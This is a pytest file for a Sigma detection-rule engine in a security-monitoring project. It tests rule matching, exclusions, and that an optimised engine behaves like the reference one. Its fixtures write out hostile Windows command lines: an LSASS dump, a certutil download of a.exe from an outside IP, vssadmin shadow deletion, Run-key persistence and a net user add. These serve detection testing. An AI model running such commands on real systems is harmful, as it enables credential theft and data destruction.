"""Sigma engine (src/soc/sigma.py): rule semantics and the fair-test exclusions."""

from __future__ import annotations

import pytest

from src.soc import sigma


def _rule(detection: dict, **extra) -> sigma.Rule:  # noqa: ANN003
    doc = {
        "title": "t",
        "level": "high",
        "tags": ["attack.execution", "attack.t1059.001"],
        "logsource": {"product": "windows", "category": "process_creation"},
        "detection": detection,
        **extra,
    }
    return sigma.compile_rule(doc)


def test_modifiers_wildcards_and_conditions() -> None:
    r = _rule(
        {
            "sel_img": {"Image|endswith": ["\\powershell.exe", "\\pwsh.exe"]},
            "sel_cmd": {"CommandLine|contains|all": ["-nop", "hidden"]},
            "filter": {"ParentImage|startswith": "C:\\Program Files\\Trusted\\"},
            "condition": "all of sel_* and not filter",
        }
    )
    assert r.techniques == ("T1059",) and r.tactics == ("execution",)
    hit = {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE",
           "commandline": "powershell -NOP -w Hidden -c x", "parentimage": "C:\\x.exe"}  # fmt: skip
    assert r.match(hit)
    assert not r.match({**hit, "commandline": "powershell -nop"})  # |all needs both
    assert not r.match({**hit, "parentimage": "C:\\Program Files\\Trusted\\a.exe"})
    w = _rule({"s": {"CommandLine": "*whoami*/all*"}, "condition": "s"})
    assert w.match({"commandline": "cmd /c WHOAMI /ALL"})


def test_windash_cidr_base64offset_and_keywords() -> None:
    wd = _rule({"s": {"CommandLine|windash|contains": " -enc "}, "condition": "s"})
    assert wd.match({"commandline": "powershell /enc AAAA"})
    net = _rule({"s": {"DestinationIp|cidr": "10.0.0.0/8"}, "condition": "1 of them"})
    assert net.match({"destinationip": "10.2.3.4"}) and not net.match(
        {"destinationip": "8.8.8.8"}
    )
    import base64

    b64 = _rule({"s": {"CommandLine|base64offset|contains": "IEX"}, "condition": "s"})
    enc = base64.b64encode(b"xx IEX (New-Object Net.WebClient)").decode()
    assert b64.match({"commandline": f"powershell -enc {enc}"})
    kw = _rule({"keywords": ["mimikatz"], "condition": "keywords"})
    assert kw.match({"anything": "run Mimikatz now"})


def test_unsupported_rules_are_rejected() -> None:
    with pytest.raises(sigma.Unsupported):
        _rule({"s": {"Image": "x"}, "condition": "s | count() > 5"})
    with pytest.raises(sigma.Unsupported):
        _rule({"s": {"Image|weird": "x"}, "condition": "s"})


def test_fair_test_exclusions() -> None:
    assert sigma._excluded({"author": "Samir Bousseaden"})
    assert sigma._excluded(
        {
            "author": "x",
            "references": ["https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES"],
        }
    )
    assert sigma._excluded({"author": "Roberto Rodriguez @Cyb3rWard0g"})
    assert not sigma._excluded(
        {"author": "Florian Roth", "references": ["https://example.com"]}
    )


@pytest.mark.skipif(not sigma.RULES_DIR.is_dir(), reason="Sigma rules not downloaded")
def test_bundled_rules_fire_on_a_real_pattern() -> None:
    from src.soc.parsers import parse_winsec

    msg = (
        "Image: C:\\Windows\\System32\\vssadmin.exe\n"
        "CommandLine: vssadmin.exe delete shadows /all /quiet\n"
        "ParentImage: C:\\Windows\\System32\\cmd.exe"
    )
    ev = parse_winsec(
        {"Id": 1, "ProviderName": "Microsoft-Windows-Sysmon", "Message": msg}
    )
    assert ev is not None and "T1490" in ev["techniques"] and "Sigma:" in ev["detail"]


# --- speed-ups must not change a single decision (owner 2026-10-15) ---------------------


@pytest.mark.parametrize(
    ("words", "event"),
    [
        (("mimikatz",), {"a": "Run MIMIKATZ now", "b": 3}),
        (("ab",), {"x": "a", "y": "b"}),  # never across two values
        (("",), {}),  # empty event: no match
        (("",), {"k": None}),
        (("none",), {"k": None}),  # str(None) -> 'none', as before
        (("42",), {"port": 4242}),
        (("x", "zz"), {"p": "zz top"}),
    ],
)
def test_keyword_search_matches_naive(words: tuple[str, ...], event: dict) -> None:
    naive = any(w in str(v).lower() for v in event.values() for w in words)
    sigma._BLOB[0] = None
    assert sigma._any_keyword(words, event) is naive


def _fields_from_benchmark(
    monkeypatch: pytest.MonkeyPatch, n: int = 1500
) -> list[tuple]:
    from src.soc import evolve, parsers

    seen: list[tuple] = []
    orig = sigma.match_source

    def rec(fields, product, category, service):  # noqa: ANN001, ANN202
        seen.append((dict(fields), product, category, service))
        return orig(fields, product, category, service)

    monkeypatch.setattr(sigma, "match_source", rec)
    for row in evolve._bench()[:n]:
        parsers._parse_line(row["line"])
    monkeypatch.setattr(sigma, "match_source", orig)
    return seen


WINDOWS_EVENTS = [
    {"Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
     "CommandLine": "powershell -nop -w hidden -enc SQBFAFgA", "ParentImage": r"C:\Windows\explorer.exe"},
    {"Image": r"C:\Windows\System32\rundll32.exe",
     "CommandLine": r"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 C:\lsass.dmp full"},
    {"Image": r"C:\Windows\System32\certutil.exe",
     "CommandLine": "certutil -urlcache -split -f http://198.51.100.7/a.exe a.exe"},
    {"Image": r"C:\Windows\System32\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet"},
    {"Image": r"C:\Windows\System32\reg.exe",
     "CommandLine": r"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v x /d c:\x.exe"},
    {"Image": r"C:\Windows\System32\whoami.exe", "CommandLine": "whoami /all"},
    {"Image": r"C:\Windows\System32\notepad.exe", "CommandLine": "notepad.exe report.txt"},
    {"Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "cmd.exe /c net user admin P@ss /add",
     "User": "CORP\\bob"},
]  # fmt: skip


def test_optimised_engine_equals_reference(monkeypatch: pytest.MonkeyPatch) -> None:
    """Every bundled rule, compiled with the optimised and with the original
    predicates, must fire on exactly the same real events (benchmark lines from the
    AIT web/mail servers + Loghub Apache) and Windows process events."""
    if not sigma.RULES_ROOT.is_dir():
        pytest.skip("Sigma rules not bundled")
    from src.soc import evolve

    if not evolve._bench():
        pytest.skip("evolve benchmark missing")
    events = _fields_from_benchmark(monkeypatch)
    assert events, "benchmark produced no Sigma lookups"
    fast = sigma.load.__wrapped__(str(sigma.RULES_ROOT))
    monkeypatch.setattr(sigma, "_REFERENCE", True)
    ref = sigma.load.__wrapped__(str(sigma.RULES_ROOT))
    monkeypatch.setattr(sigma, "_REFERENCE", False)

    def run(idx: dict) -> list[list[str]]:
        monkeypatch.setattr(sigma, "load", lambda *a, **k: idx)
        out = [sorted(r.title for r in sigma.match_source(*ev)) for ev in events]
        out += [sorted(r.title for r in sigma.match(e, 1, "Microsoft-Windows-Sysmon",
                                                     "Microsoft-Windows-Sysmon/Operational", True))
                for e in WINDOWS_EVENTS]  # fmt: skip
        return out

    got, want = run(fast), run(ref)
    assert got == want
    assert sum(map(bool, want)) > 0  # the comparison really exercised firing rules
